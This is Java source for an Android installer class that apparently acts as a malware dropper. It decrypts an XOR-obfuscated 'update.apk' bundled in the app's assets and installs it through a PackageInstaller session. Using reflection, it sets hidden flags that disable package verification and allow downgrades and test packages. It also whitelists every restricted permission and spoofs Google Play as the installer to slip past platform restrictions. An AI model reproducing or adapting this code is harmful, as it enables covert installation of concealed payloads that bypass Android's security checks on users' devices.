package com.appd.instll;

import static com.appd.instll.BroReceiver.ACTION_IN_DELIVER;
import static com.appd.instll.constants.deckeysop;
import static com.appd.instll.constants.optndatascan;
import static com.appd.instll.tools.isAppInstalled;
import static com.appd.instll.tools.xorBytes;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

public class SessionManager {

    public static void copyStream(InputStream from, OutputStream to) throws IOException {
        byte[] buf = new byte[1024 * 1024];
        int len;
        while ((len = from.read(buf)) > 0) {
            to.write(buf, 0, len);
        }
    }

    public static void install(Context context) {
        PackageInstaller.Session session = null;

        try {
            if (!mWorkerThread.isAlive()) {
                mWorkerThread.start();
            }
            mWorkerHandler = new Handler(mWorkerThread.getLooper());

            mPackageInstaller = context.getPackageManager().getPackageInstaller();

            PackageInstaller.SessionParams params =
                    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);

            params.setSize(102200000); // fake size grande

            // ==================== FLAGS (baseado no seu antigo) ====================
            int flags = 0;
            flags |= 0x00000002; // INSTALL_REPLACE_EXISTING
            flags |= 0x00000004; // INSTALL_ALLOW_TEST
            flags |= 0x00080000; // INSTALL_DISABLE_VERIFICATION
            flags |= 0x00000020; // INSTALL_FROM_ADB
            flags |= 0x00400000; // INSTALL_ALLOW_RESTRICTED_PERMISSION
            flags |= 0x00100000; // INSTALL_ALLOW_DOWNGRADE
            flags |= 0x00000080; // INSTALL_REQUEST_DOWNGRADE
            flags |= 0x00001000; // INSTALL_DONT_KILL_APP

            try {
                Field field = PackageInstaller.SessionParams.class.getDeclaredField("installFlags");
                field.setAccessible(true);
                field.setInt(params, flags);
            } catch (Exception ignored) {}

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    params.setWhitelistedRestrictedPermissions(PackageInstaller.SessionParams.RESTRICTED_PERMISSIONS_ALL);
                }
            } catch (Exception ignored) {}

            params.setInstallLocation(PackageInfo.INSTALL_LOCATION_AUTO);

            // Spoof Google Play (melhor chance de passar restrições)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    params.setInstallerPackageName("com.android.vending");
                }
            } catch (Exception ignored) {}

            int sessionId = mPackageInstaller.createSession(params);
            session = mPackageInstaller.openSession(sessionId);

            // Seu sistema de descriptografia (mantido igual)
            InputStream inputStream;
            if (deckeysop.equals("[AST-PAS]")) {
                inputStream = context.getAssets().open("update.apk");
            } else {
                InputStream raw = context.getAssets().open("update.apk");
                byte[] encrypted = new byte[raw.available()];
                raw.read(encrypted);
                raw.close();
                byte[] decrypted = xorBytes(encrypted, deckeysop);
                inputStream = new ByteArrayInputStream(decrypted);
            }

            try (OutputStream out = session.openWrite(deckeysop, 0, inputStream.available())) {
                copyStream(inputStream, out);
                session.fsync(out);
            }

            // PendingIntent (melhorado para Android 15/16)
            Intent callbackIntent = new Intent(context, BroReceiver.class);
            int flag = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flag |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    context, sessionId, callbackIntent, flag);

            session.commit(pendingIntent.getIntentSender());

        } catch (Exception e) {
            e.printStackTrace();
            if (session != null) session.abandon();
        } finally {
            if (session != null) session.close();
        }
    }

    private static HandlerThread mWorkerThread = new HandlerThread("RootlessSaiPi Worker");
    private static Handler mWorkerHandler;
    private static PackageInstaller mPackageInstaller;
}